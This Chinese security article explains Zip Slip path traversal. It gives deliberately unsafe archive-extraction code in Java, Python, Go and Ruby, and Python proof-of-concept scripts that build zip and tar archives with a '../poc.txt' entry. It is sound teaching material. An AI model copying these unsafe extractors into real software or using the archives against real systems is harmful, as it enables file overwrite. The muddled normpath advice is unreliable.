# 那些默认不安全的ZIP Slip攻击-先知社区

> **来源**: https://xz.aliyun.com/news/16525  
> **文章ID**: 16525

---

**简介**  
压缩目录穿越攻击（Zip Slip）是一种安全漏洞，主要影响处理压缩文件（如 ZIP、TAR 等格式）的应用程序。攻击者通过精心构造的压缩文件，诱导目标应用程序在解压文件时将文件提取到预期目录之外的位置，可能会覆盖重要的系统文件或者执行恶意代码。

![](images/20250110214505-193c8b64-cf59-1.png)

**攻击原理**  
通常，在解压文件时，应用程序会根据压缩文件中的文件路径来确定解压后的文件存放位置。攻击者构造一个包含特殊路径的文件，例如在文件名中使用 “../”（在许多操作系统中，这表示上级目录）这样的路径遍历序列。

例如一个 Web 应用程序允许用户上传和解压压缩文件到指定的 “/uploads” 目录。如果应用程序没有对解压路径进行严格验证，攻击者上传一个包含路径为 “../../../../etc/passwd” 的文件的压缩包。当应用程序解压这个文件时，就可能会将文件解压到 “/etc” 目录下，覆盖 “passwd” 文件（在基于 Unix/Linux 系统中），从而破坏系统的正常运行。

**研究主流语言不安全实现**  
在开发此类需求时，技术RD并不会考虑到此风险，此风险知名程度比SQL注入、RCE等较低，导致很多研发人员没有相关安全意识，且很多使用的三方模块也没有遵守default security原则，因此很容易在默认使用时造成安全漏洞，接下来我们将探索Java、Python、Golang等各种常用语言下该风险发生的情形

**Java不安全实现**  
Java 中有多种可用于解压缩的库，其中包括ZipFile、ZipInputStream和apache TarArchiveInputStream，其允许程序员使用 FileOutputStream 或 Files.copy 实现提取。

ZipInputStream  
entry.getName()没有经过清理或验证，允许攻击者创建FileOutputStream指向输出目录的指针：

```
public static void unsafe_unzip(String file_name, String output) {
    File destDir = new File(output);
    try (ZipInputStream zip = new ZipInputStream(new FileInputStream(file_name))) {
        ZipEntry entry;
        while ((entry = zip.getNextEntry()) != null) {
            String path = output + File.separator + entry.getName();
            try (FileOutputStream fos = new FileOutputStream(path)) {
                byte[] buffer = new byte[1024];
                int len;
                while ((len = zip.read(buffer)) > 0) {
                    fos.write(buffer, 0, len);
                }
            }
            zip.closeEntry();
        }
    } catch (IOException e) {}
}

```

**ZipFile**  
直接使用了压缩文件中记录的文件名（entry.getName()）来构建解压后的目标路径，没有对文件名中是否包含类似 “../” 这样的目录遍历字符进行检查

```
public static void unsafe_unzip5(String file_name, String output) {
    try (ZipFile zipFile = new ZipFile(new File(file_name))) {
        zipFile.entries().asIterator().forEachRemaining(entry -> {
            try{
                Path destPath = Paths.get(output, entry.getName());
                File fil = new File(destPath.toString());

                if (entry.isDirectory()) {
                    fil.mkdirs();
                } else {
                    fil.getParentFile().mkdirs();
                    try (InputStream in = zipFile.getInputStream(entry);
                            OutputStream out = Files.newOutputStream(destPath)) {
                        in.transferTo(out);
                    }
                }
            }catch (IOException e){

            }
        });
    } catch (IOException e) {
        e.printStackTrace();
    }
}

```

TarArchiveInputStream

```
public static void unsafe_untar(String file_name, String output) {
    File destDir = new File(output);

    try (TarArchiveInputStream tarIn = new TarArchiveInputStream(new BufferedInputStream(new FileInputStream(file_name)))){
        ArchiveEntry entry;
        while((entry = tarIn.getNextEntry()) != null){
            Path extractTo = Paths.get(output).resolve(entry.getName());
            Files.copy(tarIn, extractTo);
        }
    } catch (IOException e){
        e.printStackTrace();
    }
}

```

**Python不安全实现**  
其实在python中有不少模块默认写法都是安全的，比如ZipFile.extract()、ZipFile.extractall()，下面主要讲述不安全的使用

ZipFile+ shutil.copyfileobj()  
ZipFile除了使用库本身包含的方法外，还有几种方法可以提取数据。许多开发人员使用以下方法shutil提取 zip 的内容shutil.copyfileobj()（实际上内置方法使用相同的方法）：

```
def copyfileobj(fsrc, fdst, length=0):
    """copy data from file-like object fsrc to file-like object fdst"""
    if not length:
        length = COPY_BUFSIZE
    # Localize variable access to minimize overhead.
    fsrc_read = fsrc.read
    fdst_write = fdst.write
    while buf := fsrc_read(length):
        fdst_write(buf)

```

该方法的实现很简单，在第一个参数中，我们将文件描述符传递给要提取的文件，在第二个参数中，我们将文件描述符传递给目标。由于该方法接收文件描述符而不是路径，因此它不知道路径是否超出输出目录。

```
def unzip(file_name, output):
    # bad
    with zipfile.ZipFile(file_name, 'r') as zf:
        for filename in zf.namelist():
            # Output
            output_path = os.path.join(output, filename)
            with zf.open(filename) as source:
                with open(output_path, 'wb') as destination:
                    shutil.copyfileobj(source, destination)

```

该函数初始化ZipFile对象，然后遍历其所有文件（数组包含 zip 的所有文件名）。然后，它使用输出目录和文件名设置变量。  
由于os.path.join没有规范化路径，它允许../在文件名中引用父目录（使用），因此output\_path可能超出预期的输出目录，从而导致路径遍历。  
然后将文件描述符设置为要提取的文件作为源，将 output\_path 设置为目标。最后将源的内容写入目标。  
实现这一点的安全方法是规范化输出路径。我们可以使用 os.path.normpath() 而不是 os.path.basename(filename) 来防止路径注入

TarFile.extract()  
Python 的 tarfile 模块中的 extract() 方法用于将成员从存档提取到当前目录。此方法对于路径遍历不安全，因为它不会删除多余的分隔符和点：

```
def _extract_member(self, tarinfo, targetpath, set_attrs=True,
                    numeric_owner=False):
    """Extract the TarInfo object tarinfo to a physical
        file called targetpath.
    """
    # Fetch the TarInfo object for the given name
    # and build the destination pathname, replacing
    # forward slashes to platform specific separators.
    targetpath = targetpath.rstrip("/")
    targetpath = targetpath.replace("/", os.sep)

    # Create all upper directories.
    upperdirs = os.path.dirname(targetpath)
    if upperdirs and not os.path.exists(upperdirs):
        # Create directories that are not part of the archive with
        # default permissions.
        os.makedirs(upperdirs)

    if tarinfo.islnk() or tarinfo.issym():
        self._dbg(1, "%s -> %s" % (tarinfo.name, tarinfo.linkname))
    else:
        self._dbg(1, tarinfo.name)

    if tarinfo.isreg():
        self.makefile(tarinfo, targetpath)

```

extract() 方法调用 makefile()，将内容 (tarinfo) 写入指定路径 (targetpath)：

```
def makefile(self, tarinfo, targetpath):
    """Make a file called targetpath.
    """
    source = self.fileobj
    source.seek(tarinfo.offset_data)
    bufsize = self.copybufsize
    with bltn_open(targetpath, "wb") as target:
        if tarinfo.sparse is not None:
            for offset, size in tarinfo.sparse:
                target.seek(offset)
                copyfileobj(source, target, size, ReadError, bufsize)
            target.seek(tarinfo.size)
            target.truncate()
        else:
            copyfileobj(source, target, tarinfo.size, ReadError, bufsize)

```

makefile() 使用 copyfileobj() 来提取文件数据，这是来自 shutil 库的方法。

```
def untar(file_name, output):
    # bad
    with tarfile.open(file_name, 'r') as tf:
        for member in tf.getmembers():
            tf.extract(member)

```

**Golang不安全实现**

archive/zip  
Go 语言中通常使用 archive/zip 库处理 Zip 压缩包的基本代码结构

```
package main

import (
    "archive/zip"
    "io"
    "log"
    "os"
    "path/filepath"
)

func unzip(src string, dest string) error {
    r, err := zip.OpenReader(src)
    if err!= nil {
        return err
    }
    defer r.Close()

    for _, f := range r.File {
        // 拼接目标文件路径，这里没有对路径做安全验证，容易出现漏洞
        fpath := filepath.Join(dest, f.Name)
        if f.FileInfo().IsDir() {
            os.MkdirAll(fpath, os.ModePerm)
            continue
        }

        // 创建目标文件
        outFile, err := os.Create(fpath)
        if err!= nil {
            return err
        }
        defer outFile.Close()

        // 打开压缩包内的文件并复制内容到目标文件
        inFile, err := f.Open()
        if err!= nil {
            return err
        }
        defer inFile.Close()

        _, err = io.Copy(outFile, inFile)
        if err!= nil {
            return err
        }
    }

    return nil
}

```

archive/tar

```
package main

import (
    "archive/tar"
    "io"
    "log"
    "os"
    "path/filepath"
)

func untar(src string, dest string) error {
    file, err := os.Open(src)
    if err!= nil {
        return err
    }
    defer file.Close()

    tr := tar.NewReader(file)
    for {
        header, err := tr.Next()
        if err == io.EOF {
            break
        }
        if err!= nil {
            return err
        }

        // 构建目标文件路径，这里缺少路径安全验证，存在漏洞风险
        target := filepath.Join(dest, header.Name)
        if header.Typeflag == tar.TypeDir {
            os.MkdirAll(target, os.ModePerm)
            continue
        }

        outFile, err := os.Create(target)
        if err!= nil {
            return err
        }
        defer outFile.Close()

        _, err = io.Copy(outFile, tr)
        if err!= nil {
            return err
        }
    }

    return nil
}

```

**Ruby不安全实现**

zip模块

```
Zip::File.open(file_name).extract(entry, file_path)

```

Ruby 的 zip 库中的 extract() 方法用于将存档中的文件提取到 file\_path 目录中。此方法不安全，因为它不会删除多余的点和分隔符：

```
# Extracts `entry` to a file at `entry_path`, with `destination_directory`
# as the base location in the filesystem.
#
# NB: The caller is responsible for making sure `destination_directory` is
# safe, if it is passed.
def extract(entry, entry_path = nil, destination_directory: '.', &block)
    block ||= proc { ::Zip.on_exists_proc }
    found_entry = get_entry(entry)
    entry_path ||= found_entry.name
    found_entry.extract(entry_path, destination_directory: destination_directory, &block)
end

```

正如注释所暗示的，使用者需要负责确保 destination\_directory 是安全的。  
默认写法存在漏洞的代码示例如下：

```
def unsafe_unzip(file_name, output)
  # bad
  Zip::File.open(file_name) do |zip_file|
    zip_file.each do |entry|
      file_path = File.join(output, entry.name)
      FileUtils.mkdir_p(File.dirname(file_path))
      zip_file.extract(entry, file_path) 
    end
  end
end

```

TarReader模块

```
Gem::Package::TarReader.new(file)

```

TarReader 类没有提取方法；顾名思义，它是一个读取器。开发人员负责实现提取；如果程序员只是将提取的文件名附加到输出目录，而没有规范化路径，则可能导致路径遍历攻击，举例

```
def unsafe_untar(file_name, output)
  # bad
  File.open(file_name, 'rb') do |file_stream|
    Gem::Package::TarReader.new(file_stream).each do |entry|
      entry_var = entry.full_name
      path = File.expand_path(entry_var, output)

      File.open(path, 'wb') do |f|
        f.write(entry.read)
      end
    end
  end
end

```

**不同压缩类型构造利用文件Exp**

zip类型

```
import zipfile

def compress_file(filename):
    with zipfile.ZipFile('../payloads/payload.zip', 'w') as zipf:
        zipf.writestr(filename, "PoC")

filename = '../poc.txt'

compress_file(filename)

```

tar类型

```
import tarfile
import io

def compress_file(filename):
    # Create a TarFile object and compress it with gzip
    with tarfile.open('../payloads/payload.tar', 'w') as tarf:
        # Create an in-memory file-like object with the content "Test payload"
        data = io.BytesIO(b"Test payload")

        # Create a tarinfo object for the file we're adding
        tarinfo = tarfile.TarInfo(name=filename)
        tarinfo.size = len(data.getvalue())  # Set the size of the data

        # Add the file to the tar archive
        tarf.addfile(tarinfo, data)

filename = '../poc.txt'
compress_file(filename)

```

targz类型

```
import tarfile
import io

def create_tar_gz_archive(output_tar_gz_file, file_name, content):
    with tarfile.open(output_tar_gz_file, 'w:gz') as tar:
        # Create an in-memory file-like object with the specified content
        file_like_object = io.BytesIO(content.encode('utf-8'))

        # Create a TarInfo object for the file we're adding
        tarinfo = tarfile.TarInfo(name=file_name)
        tarinfo.size = len(content)

        # Add the file to the tar archive
        tar.addfile(tarinfo, file_like_object)

# Example usage:
create_tar_gz_archive('../payloads/payload.tar.gz', '../poc.txt', 'PoC')

```
